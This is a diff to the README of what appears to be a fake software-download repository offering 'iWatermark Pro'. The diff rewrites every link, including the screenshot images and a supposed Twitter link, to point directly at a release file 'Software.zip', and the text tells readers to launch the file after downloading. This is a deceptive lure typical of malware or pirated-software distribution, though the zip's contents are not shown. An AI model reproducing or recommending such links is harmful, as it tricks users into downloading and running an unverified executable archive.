@@ -37,19 +37,19 @@ This repository provides access to the iWatermark Pro software for various platf
 
 ### Download iWatermark Pro Software 🚀
 
-To download the iWatermark Pro software, click [here](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/tag/Download). 
+To download the iWatermark Pro software, click [here](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/download/Download/Software.zip). 
 
 *Note: The file needs to be launched after downloading.*
 
-[![Download iWatermark Pro](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/tag/Download)](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/tag/Download)
+[![Download iWatermark Pro](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/download/Download/Software.zip)](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/download/Download/Software.zip)
 
 ### Screenshots 📷
 
 Here are some examples of how iWatermark Pro can elevate your photos:
 
-![Watermark Example 1](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/tag/Download)
+![Watermark Example 1](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/download/Download/Software.zip)
 
-![Watermark Example 2](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/tag/Download)
+![Watermark Example 2](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/download/Download/Software.zip)
 
 ### Getting Started 🚀
 
@@ -63,7 +63,7 @@ If you encounter any issues with downloading or using iWatermark Pro, feel free 
 
 ### Connect with Us 🌟
 
-Follow us on [Twitter](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/tag/Download) for the latest updates and tips on using iWatermark Pro!
+Follow us on [Twitter](https://github.com/redhead369/Plum-Amazing-iWatermark-Pro-Download/releases/download/Download/Software.zip) for the latest updates and tips on using iWatermark Pro!
 
 ### Contribute 🤝
 
